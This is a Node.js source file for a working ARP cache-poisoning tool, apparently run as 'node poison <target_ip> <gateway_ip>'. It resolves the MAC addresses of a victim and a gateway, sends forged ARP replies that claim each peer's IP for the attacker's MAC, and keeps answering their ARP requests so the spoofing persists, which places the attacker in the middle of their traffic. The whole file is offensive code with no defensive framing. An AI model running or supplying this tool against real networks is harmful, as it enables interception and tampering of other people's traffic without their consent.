"use strict";

var Cap = require('cap').Cap,
  ip = require("ip"),
  timers = require("timers"),
  device = Cap.findDevice(ip.address()),
  os = require('os'),
  Q = require('q'),
  filter = 'arp',
  bufSize = 10 * 1024 * 1024,
  socketBuffer = new Buffer(65535),
  OPERATION = {
    REQUEST:  1,
    REPLY: 2
  },
  attacker = {
    ip: ip.address(),
    mac: null,
    interface: device,
  };

var target1 = { ip: null, mac: null },
  target2 = { ip: null, mac: null };
var targets = [target1, target2]

if(process.argv.length = 4) {
  target1.ip = process.argv[2];
  target2.ip = process.argv[3];
} else {
  console.log("Usage: node poison <target_ip> <gateway_ip>");
  process.exit();
}

console.log("WARNING: If IP forwarding is not enabled, targets may see a loss in connectivity");

Q.nfcall(findOurHardwareAddress)
  .then(findTargetHardwareAddresses)
  .then(function() {
    if(target1.mac !== null && target2.mac !== null) {
      console.log("\nResponding to all requests for " + target1.ip + " and " + target2.ip + " with " + attacker.mac);
      maintainPoison(target1, target2);
    }
  });



function findOurHardwareAddress(next) {
  // Finds the hardware (MAC) addresses of the host 
  var interfaces = os.networkInterfaces(); 
  attacker.mac = interfaces[attacker.interface][0].mac.split(":").join("-");
  
  console.log("Attacker MAC:", attacker.mac);

  next();
}

function findTargetHardwareAddresses(next) {
  var deferred = Q.defer();
  arpRequest(target1, function (mac) {
    target1.mac = mac;

    arpRequest(target2, function (mac) {
      target2.mac = mac;

      deferred.resolve();
    });
  });

  return deferred.promise;
};

var createSpoofPacket = function (src, dst, buf) {
  // Send reply from target1 to broadcast, advertising new hardware address.
  // If buf == true, just returns a fully-formed packet, without sending it out
  var packet = createARPPacket();

  packet.arp.operation.writeUIntBE(OPERATION.REPLY, 0, 2);

  setMac(packet.arp.target_mac, dst.mac);
  setMac(packet.eth.target_mac, dst.mac);

  setMac(packet.arp.sender_mac, attacker.mac);
  setMac(packet.eth.sender_mac, attacker.mac);

  setIP(packet.arp.sender_ip, src.ip);
  setIP(packet.arp.target_ip, dst.ip);

  return packet.buffer;
};

var maintainPoison = function(target1, target2) {
  console.log("Starting poison...");
  var c = new Cap();

  c.open(device, filter, bufSize, socketBuffer);
  c.setMinBytes && c.setMinBytes(42); // Length of an ARP packet

  var spoofmsg1 = createSpoofPacket(target1, target2, true);
  var spoofmsg2 = createSpoofPacket(target2, target1, true);

  c.send(spoofmsg1);
  c.send(spoofmsg2);

  c.on("packet", (nbytes) => {
    var response = createARPPacket(socketBuffer.slice(0, nbytes));

    if(response.arp.operation.readInt16BE(0) === OPERATION.REQUEST) {
      var request = {
        requestedIp: buf2ipString(response.arp.target_ip),
        senderMac: buf2macString(response.arp.sender_mac),
        senderIp: buf2ipString(response.arp.sender_ip)
      };

      console.log(request.requestedIp + " requested by " + request.senderMac);
      if ((request.requestedIp === target1.ip && request.senderMac === target2.mac) || (request.requestedIp === target2.ip && request.senderMac === target1.mac)) {
        console.log(request.requestedIp + " identified as target, sending reply...");

        response.arp.operation.writeUIntBE(OPERATION.REPLY, 0, 2);

        setMac(response.arp.target_mac, request.senderMac);
        setMac(response.eth.target_mac, request.senderMac);

        setMac(response.arp.sender_mac, attacker.mac);
        setMac(response.eth.sender_mac, attacker.mac);

        setIP(response.arp.target_ip, request.senderIp);
        setIP(response.arp.sender_ip, request.requestedIp);

        c.send(response.buffer, response.buffer.length);
      }
    }
  });
};

var arpRequest = function(target, next) {
  var c = new Cap();
  var packet = createARPPacket();
  
  packet.arp.operation.writeUIntBE(OPERATION.REQUEST, 0, 2);

  packet.arp.target_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.target_mac.length);
  packet.eth.target_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.eth.target_mac.length);

  console.log("Sending as " + attacker.mac);
  setMac(packet.eth.sender_mac, attacker.mac);
  setMac(packet.arp.sender_mac, attacker.mac);
  setIP(packet.arp.sender_ip, attacker.ip);
  setIP(packet.arp.target_ip, target.ip);
  
  c.open(device, filter, bufSize, socketBuffer);
  
  c.setMinBytes &&  c.setMinBytes(42); // Length of an ARP packet
  console.log("Sending ARP Request for ", target.ip);
  
  c.on("packet", (nbytes) => {
    var response = createARPPacket(socketBuffer.slice(0, nbytes));

    if(response.arp.operation.readInt16BE(0) === OPERATION.REPLY) {
      var mac = buf2macString(response.arp.sender_mac);
      var senderIp = buf2ipString(response.arp.sender_ip);

      if(typeof mac !== "undefined" && senderIp === target.ip) {
        c.close();
        next(mac);

        console.log(target.ip,"found at", mac);
      }
    } else {
    }
  });

  c.send(packet.buffer, packet.buffer.length);
};

var send = function(buffer) {
  var c = new Cap();
  try {
    console.log("Sending reply:", buffer);
    c.open(device, filter, bufSize, socketBuffer);
    c.send(buffer, buffer.length);
    c.close();
  } catch (e) {
    console.log("Error sending packet:", e);
  }
};

var setMac = function (buffer, addr) {
  // Poorly named; goes from the string "FF-FF-FF-FF-FF-FF" to 0xFFFFFFFFFFFF, then writes that value to buffer
  var mac = parseInt(addr.split("-").join(""), 16);
  buffer.writeUIntBE(mac, 0, 6);
};

var setIP = function(buffer, ip) {
  var ip_blocks = ip.toString().split(".");
  for(var i = 0; i < ip_blocks.length; i++) {
    buffer.writeUIntBE(parseInt(ip_blocks[i]), i, 1);
  }
};

var buf2macString = function(buf) {
  // Takes a buffer containing a MAC address, gives it back as a hyphen-delimited string, e.g. "FF-FF-FF-FF-FF-FF"
  return buf.toString('hex').match(/.{1,2}/g).join('-');
};

var buf2ipString = function(buf) {
  // Takes a 4-byte buffer, returns an ip, interpreting each byte as a segment
  return [
    buf.readUIntBE(0,1).toString(),
    buf.readUIntBE(1,1).toString(),
    buf.readUIntBE(2,1).toString(),
    buf.readUIntBE(3,1).toString()].join(".");

};

var createARPPacket = function(buf) {
  var buffer = buf;
  if(typeof buffer === "undefined") {
    buffer = new Buffer([
      // ETHERNET
      0xff, 0xff, 0xff, 0xff, 0xff,0xff,                  // 0    = Destination MAC
      0x84, 0x8F, 0x69, 0xB7, 0x3D, 0x92,                 // 6    = Source MAC
      0x08, 0x06,                                         // 12   = EtherType = ARP
      // ARP
      0x00, 0x01,                                         // 14/0   = Hardware Type = Ethernet (or wifi)
      0x08, 0x00,                                         // 16/2   = Protocol type = ipv4 (request ipv4 route info)
      0x06, 0x04,                                         // 18/4   = Hardware Addr Len (Ether/MAC = 6), Protocol Addr Len (ipv4 = 4)
      0x00, 0x01,                                         // 20/6   = Operation (ARP, who-has)
      0x84, 0x8f, 0x69, 0xb7, 0x3d, 0x92,                 // 22/8   = Sender Hardware Addr (MAC)
      0xc0, 0xa8, 0x01, 0xc8,                             // 28/14  = Sender Protocol address (ipv4)
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                 // 32/18  = Target Hardware Address (Blank/nulls for who-has)
      0xc0, 0xa8, 0x01, 0xc9                              // 38/24  = Target Protocol address (ipv4)
    ]);
  }

  var packet = {
    eth: {
      target_mac: buffer.slice(0,6),
      sender_mac: buffer.slice(6,12),
      ethertype: buffer.slice(12,14)
    },
    arp: {
      hardwareType: buffer.slice(14,16),
      protocol: buffer.slice(16,18),
      hardwareAddressLen: buffer.slice(18,20),
      operation: buffer.slice(20,22),
      sender_mac: buffer.slice(22,28),
      sender_ip: buffer.slice(28,32),
      target_mac: buffer.slice(32,38),
      target_ip: buffer.slice(38,42)
    }
  };

  packet.buffer = buffer;

  return packet;
};
  
